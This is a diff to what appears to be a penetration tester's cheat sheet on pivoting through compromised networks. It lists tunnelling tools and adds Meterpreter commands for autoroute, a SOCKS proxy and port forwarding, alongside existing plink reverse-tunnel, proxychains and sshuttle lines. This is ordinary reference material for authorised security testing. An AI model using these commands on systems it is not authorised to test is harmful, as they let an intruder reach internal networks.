@@ -2,11 +2,12 @@
 
 ## Tools
 
-* [chisel](https://github.com/jpillora/chisel)
-* plink.exe
+
+* ssh (-D -L -R)
 * meterpreter
-* ssh -D
-* [reGeorg](https://github.com/sensepost/reGeorg)
+* plink.exe
+* [chisel](https://github.com/jpillora/chisel)
+* [reGeorg](https://github.com/sensepost/reGeorg) (web socks proxy)
 
 ### Proxychains
 
@@ -25,6 +26,18 @@ wpscan --url <url> --proxy socks5://127.0.0.1:9517 --force
 plink.exe -l root -pw password -R 445:127.0.0.1:445 <your_ip>
 ```
 
+### Meterpreter
+
+```sh
+#Socks Proxy
+run autoroute -s <target_network>/24
+use auxiliary/server/socks4a
+exploit -j
+
+# Port forward
+portfwd add -l 3389 -p 3389 -r <target>
+```
+
 ---
 
 ### SSHUTTLE
@@ -33,7 +46,6 @@ sshuttle -r kali@<ip_target>:22 <target_network>/24
 ```
 
 ---
-
 
 ## Nmap like
 
